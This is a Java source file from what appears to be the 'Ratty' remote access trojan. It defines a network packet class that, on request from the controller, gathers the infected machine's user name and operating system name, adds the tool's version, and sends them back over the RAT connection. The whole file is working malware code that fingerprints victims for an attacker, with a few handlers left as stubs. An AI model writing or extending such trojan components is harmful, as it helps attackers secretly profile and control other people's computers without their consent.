package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.Ratty;

public final class InformationPacket extends AbstractPingPongPacket {
	
	private String name, os, version;
	
	public InformationPacket(final String name, final String os, final String version) {
		this.name = name;
		this.os = os;
		this.version = version;
		
		type = DATA;
	}
	
	public InformationPacket() {
		this("", "", "");
		
		type = REQUEST;
	}
	
	@Override
	protected void sendRequest(final ActiveConnection client) {
		//...
	}
	
	@Override
	protected void sendData(final ActiveConnection client) {
		client.writeUTF(name);
		client.writeUTF(os);
		client.writeUTF(version);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection client) {
		//...
	}
	
	@Override
	protected void receiveData(final ActiveConnection client) {
		name = client.readUTF();
		os = client.readUTF();
		version = client.readUTF();
	}
	
	@Override
	protected void executeRequest(final ActiveConnection client) {
		type = DATA;
		name = System.getProperty("user.name");
		os = System.getProperty("os.name");
		version = Ratty.VERSION;
		
		client.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection client) {
		//...
	}
	
	public String getName() {
		return name;
	}
	
	public String getOs() {
		return os;
	}
	
	public String getVersion() {
		return version;
	}
	
}
